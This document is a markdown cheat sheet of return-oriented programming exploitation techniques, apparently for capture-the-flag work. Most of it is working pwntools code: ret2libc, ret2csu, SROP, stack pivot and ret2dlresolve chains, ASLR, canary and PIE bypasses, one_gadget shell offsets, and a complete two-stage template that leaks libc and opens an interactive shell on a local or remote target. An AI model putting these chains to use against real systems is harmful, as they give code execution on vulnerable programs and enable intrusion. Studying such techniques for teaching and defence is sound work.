# Advanced ROP Techniques

## 🔧 Basic ROP Setup

### Find Gadgets
```bash
ROPgadget --binary ./vuln --ropchain
ropper -f ./vuln --search "pop rdi"
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

### Pwntools ROP
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Simple ret2libc
rop.call('puts', [elf.got['puts']])
rop.call('main')

payload = flat({
    offset: rop.chain()
})
```

## 🎯 Techniques

### ret2libc Classic
```python
# Leak libc address
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.main()

p.sendline(b'A' * offset + rop.chain())
leak = u64(p.recvline()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']

# Second stage - system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))
p.sendline(b'A' * offset + rop2.chain())
```

### ret2csu (Universal Gadgets)
```python
# __libc_csu_init gadgets - present in most binaries
# Gadget 1: pop rbx, rbp, r12, r13, r14, r15; ret
# Gadget 2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]

csu_pop = elf.address + 0x40120a  # Adjust offset
csu_call = elf.address + 0x4011f0

def csu(func, rdi, rsi, rdx):
    return flat([
        csu_pop,
        0,           # rbx
        1,           # rbp
        func,        # r12 - function to call
        rdi,         # r13 -> edi
        rsi,         # r14 -> rsi  
        rdx,         # r15 -> rdx
        csu_call,
        0, 0, 0, 0, 0, 0, 0,  # Padding for pops
    ])
```

### SROP (Sigreturn Oriented Programming)
```python
from pwn import *

# Trigger sigreturn to set all registers
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload = b'A' * offset
payload += p64(pop_rax_ret)
payload += p64(15)  # SYS_rt_sigreturn
payload += p64(syscall_ret)
payload += bytes(frame)
```

### Stack Pivot
```python
# When buffer is small, pivot to larger controlled area
# leave = mov rsp, rbp; pop rbp; ret

payload = flat({
    0: fake_stack,   # Will become new RSP
    offset_to_rbp: pivot_target - 8,
    offset_to_ret: leave_ret,
})

# fake_stack contains your ROP chain
```

### ret2dlresolve
```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

p.sendline(b'A' * offset + rop.chain())
p.sendline(dlresolve.payload)
```

## 🛡 Bypass Techniques

### ASLR Bypass
```python
# Leak address from GOT
rop.puts(elf.got['puts'])
rop.main()  # Return to main for second stage

# Partial overwrite (if leak not possible)
# Overwrite only last 1-2 bytes (12 bits of entropy)
```

### Stack Canary Bypass
```python
# Leak canary via format string
payload = b'%p.' * 20
# Or via buffer over-read
# Canary always has null byte at LSB

# Brute force (32-bit only - 24 bits)
for i in range(256):
    for j in range(256):
        for k in range(256):
            canary = bytes([0, i, j, k])
```

### PIE Bypass
```python
# Partial overwrite of return address
# Or leak .text address first
rop.puts(elf.got['__libc_start_main'])  # Leaks runtime address
```

## 🔍 Useful One-Gadgets
```bash
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6 
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)  
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

## 📋 Pwntools Template
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        return remote('host', port)
    return process([elf.path])

def main():
    p = conn()
    
    # Stage 1: Leak
    rop = ROP(elf)
    rop.puts(elf.got['puts'])
    rop.main()
    
    payload = flat({72: rop.chain()})
    p.sendlineafter(b'> ', payload)
    
    leak = u64(p.recvline()[:6].ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']
    log.success(f'libc base: {hex(libc.address)}')
    
    # Stage 2: Shell
    rop2 = ROP(libc)
    rop2.system(next(libc.search(b'/bin/sh\x00')))
    
    payload = flat({72: rop2.chain()})
    p.sendlineafter(b'> ', payload)
    
    p.interactive()

if __name__ == '__main__':
    main()
```
